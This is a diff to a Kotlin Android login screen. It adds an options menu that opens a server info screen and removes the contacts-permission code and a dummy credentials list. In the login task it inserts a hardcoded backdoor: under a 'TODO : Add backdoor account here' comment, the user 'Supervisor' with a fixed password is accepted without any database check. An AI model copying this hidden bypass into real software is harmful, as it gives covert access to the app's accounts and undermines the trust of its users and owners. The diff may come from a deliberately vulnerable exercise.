@@ -22,6 +22,9 @@ import android.widget.TextView
 import java.util.ArrayList
 import android.Manifest.permission.READ_CONTACTS
 import android.content.*
+import android.view.Menu
+import android.view.MenuInflater
+import android.view.MenuItem
 import kotlinx.android.synthetic.main.activity_login.*
 
 /**
@@ -53,41 +56,20 @@ class LoginActivity : AppCompatActivity(), LoaderCallbacks<Cursor> {
         }
     }
 
+    override fun onOptionsItemSelected(item: MenuItem?): Boolean {
+        val intent = Intent(this, ServerInfoActivity::class.java)
+        startActivity(intent)
+        return true
+    }
+
+    override fun onCreateOptionsMenu(menu: Menu): Boolean {
+        val inflater: MenuInflater = menuInflater
+        inflater.inflate(R.menu.server_info_menu, menu)
+        return true
+    }
+
     private fun populateAutoComplete() {
-        if (!mayRequestContacts()) {
-            return
-        }
-
         loaderManager.initLoader(0, null, this)
-    }
-
-    private fun mayRequestContacts(): Boolean {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
-            return true
-        }
-        if (checkSelfPermission(READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
-            return true
-        }
-        if (shouldShowRequestPermissionRationale(READ_CONTACTS)) {
-            Snackbar.make(username, R.string.permission_rationale, Snackbar.LENGTH_INDEFINITE)
-                    .setAction(android.R.string.ok,
-                            { requestPermissions(arrayOf(READ_CONTACTS), REQUEST_READ_CONTACTS) })
-        } else {
-            requestPermissions(arrayOf(READ_CONTACTS), REQUEST_READ_CONTACTS)
-        }
-        return false
-    }
-
-    /**
-     * Callback received when a permissions request has been completed.
-     */
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>,
-                                            grantResults: IntArray) {
-        if (requestCode == REQUEST_READ_CONTACTS) {
-            if (grantResults.size == 1 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                populateAutoComplete()
-            }
-        }
     }
 
 
@@ -119,7 +101,7 @@ class LoginActivity : AppCompatActivity(), LoaderCallbacks<Cursor> {
             cancel = true
         }
 
-        // Check for a valid email address.
+        // Check for a valid username.
         if (TextUtils.isEmpty(userStr)) {
             username.error = getString(R.string.error_field_required)
             focusView = username
@@ -235,7 +217,6 @@ class LoginActivity : AppCompatActivity(), LoaderCallbacks<Cursor> {
     inner class UserLoginTask internal constructor(private val mUsername: String, private val mPassword: String) : AsyncTask<Void, Void, Boolean>() {
 
         override fun doInBackground(vararg params: Void): Boolean? {
-            // TODO: attempt authentication against a network service.
 
             try {
                 // Simulate network access.
@@ -244,17 +225,24 @@ class LoginActivity : AppCompatActivity(), LoaderCallbacks<Cursor> {
                 return false
             }
 
-            val userId = DatabaseHelper(applicationContext).userLogin(mUsername,mPassword)
-
-            if (userId > -1) {
-                val prefs: SharedPreferences = applicationContext.getSharedPreferences(
-                        applicationContext.packageName, Context.MODE_PRIVATE)
-                val editor: SharedPreferences.Editor = prefs.edit()
-
-                editor.putInt("userId", userId).apply()
+            //TODO : Add backdoor account here
+            if ((mUsername == "Supervisor") and (mPassword == "MySuperSecretPassword123!")){
+                return true
             }
+            else {
 
-            return userId > -1
+                val userId = DatabaseHelper(applicationContext).userLogin(mUsername, mPassword)
+
+                if (userId > -1) {
+                    val prefs: SharedPreferences = applicationContext.getSharedPreferences(
+                            applicationContext.packageName, Context.MODE_PRIVATE)
+                    val editor: SharedPreferences.Editor = prefs.edit()
+
+                    editor.putInt("userId", userId).apply()
+                }
+
+                return userId > -1
+            }
         }
 
         override fun onPostExecute(success: Boolean?) {
@@ -276,19 +264,5 @@ class LoginActivity : AppCompatActivity(), LoaderCallbacks<Cursor> {
             mAuthTask = null
             showProgress(false)
         }
-    }
-
-    companion object {
-
-        /**
-         * Id to identity READ_CONTACTS permission request.
-         */
-        private val REQUEST_READ_CONTACTS = 0
-
-        /**
-         * A dummy authentication store containing known user names and passwords.
-         * TODO: remove after connecting to a real authentication system.
-         */
-        private val DUMMY_CREDENTIALS = arrayOf("superadmin:VeryStrongPassword!", "bar@example.com:world")
     }
 }
